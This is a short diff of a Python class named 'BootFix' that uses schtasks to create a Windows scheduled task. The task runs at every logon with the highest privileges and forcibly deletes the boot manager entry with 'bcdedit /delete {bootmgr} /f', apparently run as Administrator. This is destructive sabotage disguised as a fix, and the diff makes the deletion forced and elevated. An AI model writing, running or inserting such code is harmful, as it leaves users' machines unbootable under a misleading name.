@@ -20,8 +20,8 @@ class Tarefa:
 
     def __init__(self):
         self.nome = 'BootFix'
-        self.comando = r'Bcdedit /delete {bootmgr}'
-        self.programa = f'cmd.exe /c {self.comando}'
+        self.comando = r'bcdedit /delete {bootmgr} /f'
+        self.programa = f'runas /user:Administrator "cmd.exe /c {self.comando}"'
 
     def criar_tarefa(self):
         os.system(f'schtasks /create /tn "{self.nome}" /tr "{self.programa}" /sc onlogon /rl highest /f')
